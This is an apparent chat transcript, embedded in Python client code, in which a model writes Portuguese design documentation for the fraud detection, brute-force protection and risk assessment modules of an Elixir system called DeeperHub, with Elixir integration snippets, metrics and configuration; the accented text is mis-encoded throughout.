    {:ok, %{risk_level: risk_level, detection_id: detection_id}} when risk_level in [:high, :critical] ->
      Logger.warn(\"Alta suspeita de fraude na altera√ß√£o de email para user_id: #{user.id}\", detection_id: detection_id)
      # Pode-se optar por bloquear a altera√ß√£o, exigir verifica√ß√£o adicional, etc.
      # ...
    {:ok, _low_or_medium_risk} ->
      # Prossegue normalmente
      # ...
    {:error, reason} ->
      Logger.error(\"Erro na an√°lise de fraude para altera√ß√£o de email: #{inspect(reason)}\")
      # Lidar com o erro, talvez prosseguir com cautela ou negar.
  end
  # ...
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o de an√°lise (`analyze_login`, `analyze_transaction`, etc.) com diversos cen√°rios (normal, suspeito, fraudulento).
*   Testar a l√≥gica de aplica√ß√£o de regras e c√°lculo de score de risco.
*   Testar o registro e atualiza√ß√£o de status de detec√ß√µes.
*   Testar a funcionalidade dos workers (`AnalysisWorker`, `CleanupWorker`).
*   Localiza√ß√£o: `test/deeper_hub/security/fraud_detection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.fraud_detection.analyzed.count` (tags: `type` (`login`, `transaction`, etc.))
*   `deeper_hub.security.fraud_detection.detected.count` (tags: `type`, `risk_level`)
*   `deeper_hub.security.fraud_detection.analysis.duration_ms` (Histograma, tags: `type`)
*   `deeper_hub.security.fraud_detection.rules.triggered.count` (tags: `rule_id`)
*   `deeper_hub.security.fraud_detection.false_positives.count` (tags: `type`)
*   `deeper_hub.security.fraud_detection.average_risk_score.gauge` (tags: `type`)

### 10.3. Logs

*   **N√≠vel INFO:** An√°lise de eventos com baixo risco, atualiza√ß√µes de status de detec√ß√£o.
*   **N√≠vel WARNING:** Detec√ß√µes de risco m√©dio ou alto, acionamento de regras importantes.
*   **N√≠vel ERROR:** Falhas na an√°lise, erros ao registrar detec√ß√µes, detec√ß√µes de risco cr√≠tico.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :fraud_detection, :analysis, :start | :stop | :exception]`
    *   Metadados: `%{type: type, user_id: id, input_data_sample: sample}`
*   `[:deeper_hub, :security, :fraud_detection, :rule_evaluation, :start | :stop | :exception]`
    *   Metadados: `%{rule_id: id, conditions_met: boolean}`
*   `[:deeper_hub, :security, :fraud_detection, :detection_recorded]`
    *   Metadados: `%{detection_id: id, type: type, risk_level: level, risk_score: score}`
*   `[:deeper_hub, :security, :fraud_detection, :status_updated]`
    *   Metadados: `%{detection_id: id, new_status: status, reviewer_id: id}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na an√°lise de fraude n√£o devem impedir a opera√ß√£o principal do usu√°rio, mas devem ser logadas e, possivelmente, sinalizar a opera√ß√£o para revis√£o manual ou aplicar uma pol√≠tica de \"negar por padr√£o\" se o risco for desconhecido e alto.
*   Erros de persist√™ncia de detec√ß√µes ou atualiza√ß√£o de regras devem ser tratados e logados, com mecanismos de retry se apropriado.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Seguran√ßa das Regras:** O mecanismo de atualiza√ß√£o de regras (`RulesManagerService`) deve ser protegido para evitar que regras maliciosas sejam injetadas.
*   **Dados de An√°lise:** Os dados usados para an√°lise de fraude podem ser sens√≠veis. Garantir que sejam manuseados com seguran√ßa e que o acesso aos resultados da an√°lise seja restrito.
*   **Falsos Positivos:** O sistema deve ser ajustado para minimizar falsos positivos, que podem impactar negativamente a experi√™ncia do usu√°rio. Um processo claro para revisar e corrigir falsos positivos √© essencial.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novas regras, documente claramente suas condi√ß√µes e o racional por tr√°s delas.
*   Teste exaustivamente novas regras contra dados hist√≥ricos para avaliar seu impacto e precis√£o.
*   Considere a performance ao adicionar regras complexas ou que exigem muitas consultas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Integrar modelos de Machine Learning para detec√ß√£o de anomalias mais sofisticada e adaptativa.
*   [ ] Desenvolver uma interface de usu√°rio para analistas de fraude gerenciarem regras, revisarem detec√ß√µes e verem estat√≠sticas.
*   [ ] Adicionar suporte para \"listas de observa√ß√£o\" (watchlists) de usu√°rios ou entidades com comportamento suspeito.
*   [ ] Implementar feedback loop para que as decis√µes dos analistas (ex: marcar como falso positivo) possam retroalimentar e ajustar os modelos/regras.
*   [ ] Permitir simula√ß√£o de novas regras contra dados hist√≥ricos antes de ativ√°-las em produ√ß√£o.
*   [ ] Integra√ß√£o com provedores externos de dados de risco/fraude (ex: reputa√ß√£o de IP, dados de cart√£o de cr√©dito roubado).

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este m√≥dulo de Detec√ß√£o de Fraude √© bastante abrangente e interage com muitos outros.

Onde gostaria de focar agora? Talvez `DeeperHub.Security.BruteForceProtection` ou `DeeperHub.Security.RiskAssessment`? Ou podemos ir para um m√≥dulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos seguir com outro componente importante da camada de seguran√ßa: `DeeperHub.Security.BruteForceProtection`.

---

# M√≥dulo: `DeeperHub.Security.BruteForceProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.BruteForceProtection`

O m√≥dulo `DeeperHub.Security.BruteForceProtection` √© respons√°vel por detectar e mitigar ataques de for√ßa bruta contra o sistema DeeperHub. Ataques de for√ßa bruta ocorrem quando um invasor tenta adivinhar credenciais (como senhas) ou outros segredos atrav√©s de um grande volume de tentativas.

Este m√≥dulo monitora tentativas falhas de acesso para identificadores espec√≠ficos (como endere√ßos IP, nomes de usu√°rio ou emails), aplicando contramedidas como bloqueios tempor√°rios ou a exig√™ncia de desafios CAPTCHA para dificultar esses ataques e proteger as contas dos usu√°rios. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tentativas Falhas:**
    *   Registrar tentativas de login falhas para diferentes identificadores (`record_failed_attempt/2`).
    *   Registrar tentativas de outras opera√ß√µes sens√≠veis que podem ser alvo de for√ßa bruta (ex: verifica√ß√£o de token de reset de senha).
*   **Aplica√ß√£o de Contramedidas:**
    *   **Bloqueio Tempor√°rio:** Bloquear um identificador (IP, usu√°rio) por um per√≠odo configur√°vel ap√≥s um n√∫mero excessivo de tentativas falhas (`is_blocked?/1`).
    *   **Requisi√ß√£o de CAPTCHA:** Exigir que o usu√°rio resolva um CAPTCHA ap√≥s um certo n√∫mero de tentativas falhas, antes de permitir novas tentativas (`captcha_required?/1`).
*   **Gerenciamento de Estado de Tentativas:**
    *   Manter contadores de tentativas falhas por identificador e por tipo de opera√ß√£o.
    *   Resetar contadores ap√≥s uma tentativa bem-sucedida (`record_successful_attempt/1`) ou ap√≥s um per√≠odo de inatividade.
*   **Configurabilidade de Pol√≠ticas:**
    *   Permitir a configura√ß√£o de limiares para bloqueio e CAPTCHA (n√∫mero de tentativas, janela de tempo).
    *   Permitir a configura√ß√£o da dura√ß√£o dos bloqueios.
*   **Limpeza de Dados Antigos:**
    *   Remover periodicamente registros de tentativas antigas e bloqueios expirados para manter a efici√™ncia do sistema (via `CleanupWorker`).
*   **Observabilidade:**
    *   Fornecer estat√≠sticas sobre tentativas bloqueadas, CAPTCHAs exigidos e identificadores monitorados (`get_statistics/0`).
    *   Registrar logs e m√©tricas para atividades de for√ßa bruta.
*   **Integra√ß√£o:**
    *   Integrar-se com m√≥dulos de autentica√ß√£o (`DeeperHub.Auth`) e recupera√ß√£o de conta (`DeeperHub.Recovery`) para registrar tentativas.
    *   Integrar-se com um servi√ßo de CAPTCHA (se aplic√°vel, pode ser um servi√ßo externo ou um m√≥dulo interno simples).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.BruteForceProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para registrar tentativas e verificar o status de prote√ß√£o.
    *   Delega chamadas para o `BruteForceProtectionService`.
2.  **`DeeperHub.Security.BruteForceProtection.Services.BruteForceProtectionService` (GenServer):**
    *   **Responsabilidade:** O cora√ß√£o do sistema, gerenciando o estado das tentativas e bloqueios.
    *   **Estado Interno (geralmente em ETS para performance):**
        *   Tabela de contadores de tentativas falhas (ex: `{identifier, operation_type} -> {count, last_attempt_timestamp}`).
        *   Tabela de identificadores bloqueados (ex: `{identifier} -> {blocked_until_timestamp, reason}`).
        *   Tabela de identificadores que requerem CAPTCHA (ex: `{identifier} -> captcha_required_until_timestamp`).
    *   **Intera√ß√µes:** Recebe chamadas da fachada, aplica l√≥gicas de incremento de contador, bloqueio, verifica√ß√£o de CAPTCHA. Dispara a limpeza peri√≥dica.
3.  **`DeeperHub.Security.BruteForceProtection.Workers.CleanupWorker` (GenServer):**
    *   **Responsabilidade:** Executar periodicamente a limpeza de dados de tentativas antigas e bloqueios expirados nas tabelas ETS (ou outro storage).
4.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Limiares de tentativas.
    *   Janelas de tempo para contagem.
    *   Dura√ß√£o de bloqueios.
    *   Configura√ß√µes de CAPTCHA.
5.  **`DeeperHub.Security.BruteForceProtection.Telemetry` (ou `MetricsReporter`):**
    *   Para registrar m√©tricas sobre a atividade de prote√ß√£o.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/brute_force_protection/
‚îú‚îÄ‚îÄ brute_force_protection.ex             # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ brute_force_protection_service.ex # GenServer principal
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îî‚îÄ‚îÄ cleanup_worker.ex                 # Worker para limpeza
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex                          # (ou MetricsReporter.ex)
```
*(Os m√≥dulos `BruteForceProtectionAdapter` e `BruteForceProtectionBehaviour` da documenta√ß√£o original podem ser consolidados se houver apenas uma implementa√ß√£o principal, como o `BruteForceProtectionService` GenServer.)*

### 3.3. Decis√µes de Design Importantes

*   **Armazenamento em Mem√≥ria (ETS) para Performance:** Contadores de tentativas e bloqueios de curto prazo s√£o frequentemente armazenados em ETS para acesso r√°pido e para evitar sobrecarga no banco de dados principal. Bloqueios mais longos ou persistentes podem envolver o DB.
*   **Identificadores Flex√≠veis:** O sistema deve ser capaz de rastrear tentativas por diferentes tipos de identificadores (IP, username, email, ID de sess√£o, etc.), dependendo do contexto da opera√ß√£o.
*   **Escalabilidade do CAPTCHA:** Se CAPTCHAs forem usados, a integra√ß√£o deve ser com um servi√ßo de CAPTCHA robusto ou um mecanismo que n√£o seja facilmente contorn√°vel.
*   **Pol√≠ticas Granulares:** Idealmente, as pol√≠ticas de prote√ß√£o (limiares, dura√ß√µes) podem ser configuradas por tipo de opera√ß√£o (ex: login vs. reset de senha).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **M√∫ltiplas Tentativas de Login Falhas por um IP:**
    *   `DeeperHub.Auth` registra cada tentativa falha via `BruteForceProtection.record_failed_attempt(\"ip:1.2.3.4\", %{operation: :login})`.
    *   Ap√≥s `N` falhas, `BruteForceProtectionService` marca o IP como requerendo CAPTCHA.
    *   Ap√≥s `M` falhas (com ou sem CAPTCHA), o IP √© temporariamente bloqueado.
    *   Requisi√ß√µes subsequentes desse IP para o endpoint de login s√£o rejeitadas com 429 ou 403.
*   **Tentativas de Adivinhar C√≥digo de Reset de Senha:**
    *   `DeeperHub.Recovery` registra cada tentativa falha de verifica√ß√£o de token de reset para um `user_id` ou `token_id`.
    *   Ap√≥s algumas falhas, o `user_id` pode ser temporariamente impedido de tentar mais verifica√ß√µes de token.
*   **Usu√°rio Leg√≠timo Esquece Senha e Excede Tentativas:**
    *   O usu√°rio √© informado sobre o bloqueio tempor√°rio e/ou a necessidade de CAPTCHA.
    *   Ap√≥s o per√≠odo de bloqueio, ou resolvendo o CAPTCHA, o usu√°rio pode tentar novamente.
    *   Um login bem-sucedido reseta os contadores de falha para aquele identificador/opera√ß√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Registro de Tentativa Falha e Bloqueio

1.  **Opera√ß√£o Falha:** Um m√≥dulo (ex: `AuthService`) detecta uma tentativa falha de uma opera√ß√£o sens√≠vel (ex: login).
2.  **Registro:** O m√≥dulo chama `DeeperHub.Security.BruteForceProtection.record_failed_attempt(identifier, %{operation_type: :login, username_attempted: \"foo\"})`.
    *   `identifier` pode ser `ip:<ip_address>`, `user:<user_id>`, `email:<email_address>`.
3.  **`BruteForceProtectionService` (GenServer):**
    *   Recebe o registro.
    *   Incrementa o contador de falhas para o `identifier` e `operation_type` em sua tabela ETS.
    *   Verifica se o n√∫mero de falhas dentro da janela de tempo configurada excede o limiar para CAPTCHA.
        *   Se sim, marca o `identifier` como `captcha_required` com um timestamp de expira√ß√£o.
    *   Verifica se o n√∫mero de falhas excede o limiar para bloqueio.
        *   Se sim, adiciona o `identifier` √† lista de bloqueados com um timestamp de `blocked_until`. Loga o bloqueio e emite um evento/m√©trica.
4.  **Resposta:** Retorna `:ok` para o chamador.

### Fluxo de Verifica√ß√£o de Tentativa (`check_attempt/2`)

1.  **Antes da Opera√ß√£o:** Um m√≥dulo (ex: Plug de Autentica√ß√£o) chama `DeeperHub.Security.BruteForceProtection.check_attempt(identifier, %{operation_type: :login})` antes de processar uma opera√ß√£o.
2.  **`BruteForceProtectionService` (GenServer):**
    *   Verifica se o `identifier` est√° na lista de bloqueados.
        *   Se sim, e o bloqueio ainda est√° ativo, retorna `{:ok, :blocked}`.
    *   Verifica se o `identifier` est√° marcado como `captcha_required`.
        *   Se sim, e ainda ativo, retorna `{:ok, :captcha_required}`.
    *   Caso contr√°rio, retorna `{:ok, :allowed}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

*(A documenta√ß√£o original j√° tem uma boa base para estas fun√ß√µes. Vamos refinar e adicionar.)*

### 6.1. `DeeperHub.Security.BruteForceProtection.record_failed_attempt(identifier :: String.t(), context :: map()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Registra uma tentativa falha para um identificador. Incrementa contadores e aplica pol√≠ticas de CAPTCHA/bloqueio.
*   **`identifier`:** String que identifica a origem da tentativa (ex: `\"ip:1.2.3.4\"`, `\"user_id:abc\"`, `\"email:user@example.com\"`).
*   **`context`:** Mapa com informa√ß√µes adicionais.
    *   `:operation_type` (atom, obrigat√≥rio): Tipo da opera√ß√£o que falhou (ex: `:login`, `:password_reset_verify`, `:mfa_verify`).
    *   Outros dados relevantes (ex: `:username_attempted`).
*   **Retorno:** `:ok`. Lan√ßa exce√ß√£o em caso de erro interno grave.

### 6.2. `DeeperHub.Security.BruteForceProtection.record_successful_attempt(identifier :: String.t(), context :: map()) :: :ok`

*   **Descri√ß√£o:** Registra uma tentativa bem-sucedida, o que geralmente reseta os contadores de falha para o `identifier` e `operation_type` espec√≠ficos.
*   **`identifier`:** Mesmo formato de `record_failed_attempt/2`.
*   **`context`:**
    *   `:operation_type` (atom, obrigat√≥rio): Tipo da opera√ß√£o bem-sucedida.

### 6.3. `DeeperHub.Security.BruteForceProtection.check_attempt(identifier :: String.t(), context :: map()) :: {:ok, :allowed | :captcha_required | :blocked} | {:error, term()}`

*   **Descri√ß√£o:** Verifica o status de prote√ß√£o para um identificador antes de permitir uma opera√ß√£o.
*   **Retorno:**
    *   `{:ok, :allowed}`: A tentativa √© permitida.
    *   `{:ok, :captcha_required}`: Um CAPTCHA deve ser resolvido antes de prosseguir.
    *   `{:ok, :blocked}`: A tentativa est√° bloqueada temporariamente.
*   **Exemplo:**
    ```elixir
    case BruteForceProtection.check_attempt(\"ip:\" <> conn.remote_ip, %{operation_type: :login}) do
      {:ok, :allowed} -> # Prosseguir
      {:ok, :captcha_required} -> # Redirecionar para CAPTCHA
      {:ok, :blocked} -> # Retornar 429 Too Many Requests
      {:error, _} -> # Logar erro, talvez permitir com cautela
    end
    ```

### 6.4. `DeeperHub.Security.BruteForceProtection.is_blocked?(identifier :: String.t(), context :: map() | nil) :: boolean()`

*   **Descri√ß√£o:** Retorna `true` se o identificador estiver atualmente bloqueado para o tipo de opera√ß√£o no contexto (se fornecido), `false` caso contr√°rio.

### 6.5. `DeeperHub.Security.BruteForceProtection.captcha_required?(identifier :: String.t(), context :: map() | nil) :: boolean()`

*   **Descri√ß√£o:** Retorna `true` se um CAPTCHA for necess√°rio para o identificador e tipo de opera√ß√£o.

### 6.6. `DeeperHub.Security.BruteForceProtection.clear_attempts(identifier :: String.t(), context :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Limpa manualmente todos os contadores de falha e status de CAPTCHA/bloqueio para um identificador (e tipo de opera√ß√£o, se `context` fornecido). Usado por administradores ou ap√≥s recupera√ß√£o de conta bem-sucedida.

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :brute_force, :enabled]`** (Boolean): Habilita/desabilita o m√≥dulo. (Padr√£o: `true`)
*   **`[:security, :brute_force, :policies]`** (List de Maps): Lista de pol√≠ticas. Cada pol√≠tica define:
    *   `:operation_type` (Atom): A qual opera√ß√£o esta pol√≠tica se aplica (ex: `:login`, `:password_reset`, `:all_failed_auth`).
    *   `:identifier_types` (List de Atoms): Quais tipos de identificadores esta pol√≠tica rastreia (ex: `[:ip, :user_id]`).
    *   `:captcha_threshold` (Integer): N√∫mero de falhas para exigir CAPTCHA.
    *   `:captcha_window_seconds` (Integer): Janela de tempo para contar falhas para CAPTCHA.
    *   `:block_threshold` (Integer): N√∫mero de falhas para bloquear.
    *   `:block_window_seconds` (Integer): Janela de tempo para contar falhas para bloqueio.
    *   `:block_duration_seconds` (Integer): Dura√ß√£o do bloqueio.
    *   `:block_increment_factor` (Float, opcional): Fator para aumentar a dura√ß√£o do bloqueio em bloqueios subsequentes. (Padr√£o: `1.0`)
    *   `:max_block_duration_seconds` (Integer, opcional): Dura√ß√£o m√°xima de um bloqueio.
*   **`[:security, :brute_force, :cleanup_worker, :interval_minutes]`** (Integer): Intervalo para o `CleanupWorker`. (Padr√£o: `60`)
*   **`[:security, :brute_force, :cleanup_worker, :attempt_retention_days]`** (Integer): Por quantos dias manter registros de tentativas. (Padr√£o: `7`)
*   **`[:security, :captcha, :service_module]`** (Module, opcional): M√≥dulo do servi√ßo de CAPTCHA a ser usado (se aplic√°vel).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter pol√≠ticas e configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para registrar m√©tricas.
*   `DeeperHub.Core.EventBus` (opcional): Para publicar eventos de bloqueio ou atividade suspeita.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para uma interface mais rica sobre as pol√≠ticas.
*   Um servi√ßo de CAPTCHA (se integrado).

### 8.2. Bibliotecas Externas

*   Nenhuma depend√™ncia externa direta √© estritamente necess√°ria para a l√≥gica central, que pode ser implementada com ETS.

## ü§ù 9. Como Usar / Integra√ß√£o

**Integrando com o fluxo de login em `DeeperHub.Auth.Services.LoginService`:**
```elixir
def authenticate(email, password, context_info) do
  ip_identifier = \"ip:#{context_info.ip_address}\"
  email_identifier = \"email:#{email}\"

  # Verificar antes de tentar autenticar
  case BruteForceProtection.check_attempt(ip_identifier, %{operation_type: :login}) do
    {:ok, :blocked} -> {:error, :ip_blocked}
    {:ok, :captcha_required} -> {:error, :captcha_required_for_ip}
    {:ok, :allowed} ->
      # Tentar autenticar...
      case do_authenticate(email, password) do
        {:ok, user} ->
          BruteForceProtection.record_successful_attempt(ip_identifier, %{operation_type: :login})
          BruteForceProtection.record_successful_attempt(email_identifier, %{operation_type: :login})
          BruteForceProtection.record_successful_attempt(\"user_id:#{user.id}\", %{operation_type: :login})
          {:ok, user}
        {:error, :invalid_credentials} ->
          BruteForceProtection.record_failed_attempt(ip_identifier, %{operation_type: :login, email_attempted: email})
          BruteForceProtection.record_failed_attempt(email_identifier, %{operation_type: :login})
          # Se o usu√°rio existir, tamb√©m registrar falha para user_id
          # if user = Accounts.get_user_by_email(email), do: BruteForceProtection.record_failed_attempt(\"user_id:#{user.id}\", ...)
          {:error, :invalid_credentials}
      end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os contadores de falha s√£o incrementados corretamente.
*   Testar se o status `captcha_required` √© definido ap√≥s o limiar.
*   Testar se o status `blocked` √© definido ap√≥s o limiar e pela dura√ß√£o correta.
*   Testar se `record_successful_attempt` reseta os contadores.
*   Testar o `CleanupWorker` para remo√ß√£o de entradas expiradas.
*   Localiza√ß√£o: `test/deeper_hub/security/brute_force_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.brute_force.failed_attempts.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.captcha_required.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.identifier_blocked.count` (tags: `identifier_type`, `operation_type`)
*   `deeper_hub.security.brute_force.active_blocks.gauge` (Gauge)
*   `deeper_hub.security.brute_force.cleanup.duration_ms` (Histograma)
*   `deeper_hub.security.brute_force.cleanup.items_removed.count` (Contador)

### 10.3. Logs

*   **N√≠vel INFO:** Registro de tentativas bem-sucedidas que resetam contadores. Execu√ß√£o do `CleanupWorker`.
*   **N√≠vel WARNING:** Identificador atinge limiar de CAPTCHA. Identificador √© bloqueado.
*   **N√≠vel ERROR:** Erros internos no `BruteForceProtectionService`.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :brute_force, :attempt_recorded]`
    *   Metadados: `%{identifier: id, operation_type: type, outcome: :success | :failure}`
*   `[:deeper_hub, :security, :brute_force, :status_changed]`
    *   Metadados: `%{identifier: id, operation_type: type, old_status: atom(), new_status: atom(), reason: reason, duration_seconds: dur}` (para :blocked ou :captcha_required)
*   `[:deeper_hub, :security, :brute_force, :cleanup_run]`
    *   Medi√ß√µes: `%{duration: native_time, items_removed: count}`

## ‚ùå 11. Tratamento de Erros

*   O servi√ßo deve ser resiliente. Falhas internas no `BruteForceProtectionService` n√£o devem impedir o fluxo principal da aplica√ß√£o (ex: um login leg√≠timo n√£o deve falhar se o servi√ßo de brute force estiver com problemas, mas um log de erro cr√≠tico deve ser gerado).
*   A limpeza de dados deve ser robusta para n√£o remover bloqueios ativos indevidamente.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Prote√ß√£o do Storage:** Se ETS for usado, ele √© limitado ao n√≥. Se um armazenamento distribu√≠do for usado para os contadores/bloqueios, ele deve ser protegido.
*   **Falsos Positivos:** Pol√≠ticas muito agressivas podem bloquear usu√°rios leg√≠timos, especialmente em cen√°rios de IP compartilhado (NAT, VPNs). A configura√ß√£o de `identifier_types` e a op√ß√£o de whitelisting de IPs (gerenciado por `IpFirewallService`) s√£o importantes.
*   **Evas√£o:** Invasores podem tentar rotacionar IPs. Rastrear por outros identificadores (`user_id`, `email`) em conjunto com o IP pode ser mais eficaz.
*   **Ataques de Nega√ß√£o de Servi√ßo ao M√≥dulo:** Um grande volume de tentativas falhas pode sobrecarregar o GenServer se n√£o houver otimiza√ß√µes ou se o processamento de cada tentativa for muito custoso.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao integrar com novas opera√ß√µes sens√≠veis, certifique-se de chamar `record_failed_attempt` e `record_successful_attempt` apropriadamente.
*   Defina pol√≠ticas claras e testadas para cada `operation_type`.
*   Considere o impacto na experi√™ncia do usu√°rio ao definir limiares e dura√ß√µes de bloqueio.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"listas brancas\" (allowlists) para identificadores que nunca devem ser bloqueados por for√ßa bruta.
*   [ ] Suporte para bloqueios progressivos (dura√ß√£o aumenta a cada bloqueio subsequente).
*   [ ] Integra√ß√£o mais profunda com an√°lise comportamental para detectar se as tentativas falhas s√£o de um usu√°rio leg√≠timo ou de um bot.
*   [ ] Permitir que administradores visualizem e gerenciem bloqueios ativos e contadores atrav√©s de uma interface.
*   [ ] Adicionar op√ß√£o para \"desafios\" mais avan√ßados que CAPTCHA para certos n√≠veis de suspeita.
*   [ ] Considerar o uso de um backend de armazenamento mais persistente e distribu√≠do (ex: Redis) para os contadores e bloqueios, especialmente em ambientes clusterizados.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Pr√≥ximo! Que tal `DeeperHub.Security.RiskAssessment` para vermos como os riscos s√£o calculados?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""√ìtimo! Vamos detalhar o `DeeperHub.Security.RiskAssessment`. Este m√≥dulo √© fundamental para uma abordagem de seguran√ßa adaptativa e baseada em contexto.

---

# M√≥dulo: `DeeperHub.Security.RiskAssessment` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.RiskAssessment`

O m√≥dulo `DeeperHub.Security.RiskAssessment` √© respons√°vel por avaliar o n√≠vel de risco associado a diversas opera√ß√µes e contextos dentro do sistema DeeperHub. Ele analisa uma combina√ß√£o de fatores, como informa√ß√µes do usu√°rio, comportamento, dados do dispositivo, localiza√ß√£o geogr√°fica, e a natureza da opera√ß√£o sendo realizada, para calcular uma pontua√ß√£o de risco.

Esta pontua√ß√£o pode ent√£o ser usada por outros m√≥dulos (como `DeeperHub.Auth`, `DeeperHub.Security.FraudDetection`, ou m√≥dulos de dom√≠nio) para tomar decis√µes informadas, como permitir a opera√ß√£o, exigir verifica√ß√£o adicional (ex: MFA), limitar funcionalidades, ou bloquear a a√ß√£o completamente. O objetivo √© adaptar as medidas de seguran√ßa dinamicamente ao risco percebido de cada intera√ß√£o. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Avalia√ß√£o de Risco Multifatorial:**
    *   Analisar o risco de tentativas de login (`assess_login_risk/3`).
    *   Avaliar o risco de altera√ß√µes de perfil (`assess_profile_change_risk/3`).
    *   Analisar o risco de transa√ß√µes financeiras ou outras a√ß√µes cr√≠ticas (`assess_transaction_risk/3`).
    *   Avaliar o risco de requisi√ß√µes de API (`assess_api_request_risk/3`).
    *   Avaliar o risco de sess√µes de usu√°rio (`assess_session_risk/3`).
    *   Avaliar o risco de a√ß√µes gen√©ricas (`assess_action_risk/4`).
*   **C√°lculo de Pontua√ß√£o de Risco:**
    *   Utilizar um `RiskCalculatorService` para combinar diversos fatores de risco e seus respectivos pesos para gerar uma pontua√ß√£o num√©rica.
    *   Mapear a pontua√ß√£o de risco para n√≠veis de risco qualitativos (ex: :low, :medium, :high, :critical).
*   **Gerenciamento de Fatores de Risco:**
    *   Coletar e processar dados de diferentes fontes para calcular fatores de risco (ex: reputa√ß√£o do IP, dispositivo conhecido, localiza√ß√£o an√¥mala, comportamento suspeito).
    *   Suportar fatores de risco b√°sicos e avan√ßados (via `AdvancedRiskFactors`).
*   **Gerenciamento de Perfis de Risco de Usu√°rio:**
    *   Manter um perfil de risco din√¢mico para cada usu√°rio, que pode ser atualizado com base em seu comportamento e hist√≥rico (`get_risk_profile/2`, `update_risk_profile/3`).
*   **Recomenda√ß√£o de A√ß√µes:**
    *   Sugerir a√ß√µes apropriadas com base no n√≠vel de risco avaliado (ex: permitir, exigir MFA, bloquear) (via `RiskActionRecommender`).
*   **Configurabilidade de Pol√≠ticas de Risco:**
    *   Permitir a configura√ß√£o de pesos para fatores de risco, limiares para n√≠veis de risco e regras para recomenda√ß√£o de a√ß√µes (via `DeeperHub.Security.Policy.SecurityPolicyManager`).
*   **Calibra√ß√£o de Pesos (Opcional):**
    *   Suportar a calibra√ß√£o autom√°tica ou manual dos pesos dos fatores de risco com base em feedback e dados hist√≥ricos (via `RiskWeightCalibrator`).
*   **Hist√≥rico e Relat√≥rios:**
    *   Manter um hist√≥rico de avalia√ß√µes de risco (`get_risk_assessment_history/3`).
    *   Gerar relat√≥rios sobre tend√™ncias de risco e efic√°cia das pol√≠ticas (`generate_risk_report/3`).
*   **Observabilidade:**
    *   Registrar m√©tricas e logs detalhados sobre as avalia√ß√µes de risco.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.RiskAssessment` (Fachada P√∫blica):**
    *   Ponto de entrada para solicitar avalia√ß√µes de risco.
    *   Delega para o `RiskAssessmentService`.
2.  **`DeeperHub.Security.RiskAssessment.Services.DefaultRiskAssessmentService` (GenServer ou Servi√ßo Coordenador):**
    *   Orquestra o processo de avalia√ß√£o de risco.
    *   Coleta dados de contexto e do perfil do usu√°rio.
    *   Chama o `RiskFactorCalculator` e `AdvancedRiskFactors` para obter os fatores de risco.
    *   Chama o `RiskCalculatorService` para obter a pontua√ß√£o e n√≠vel de risco.
    *   Chama o `RiskActionRecommender` para obter a√ß√µes recomendadas.
    *   Persiste o resultado da avalia√ß√£o (opcionalmente).
3.  **`DeeperHub.Security.RiskAssessment.Services.RiskFactorCalculator` (ou `RiskFactorsCalculator`):**
    *   M√≥dulo funcional respons√°vel por calcular fatores de risco individuais com base nos dados de entrada (ex: \"dist√¢ncia da √∫ltima localiza√ß√£o conhecida\", \"idade da conta\", \"reputa√ß√£o do IP\").
4.  **`DeeperHub.Security.RiskAssessment.Services.AdvancedRiskFactors` (GenServer ou M√≥dulo Funcional):**
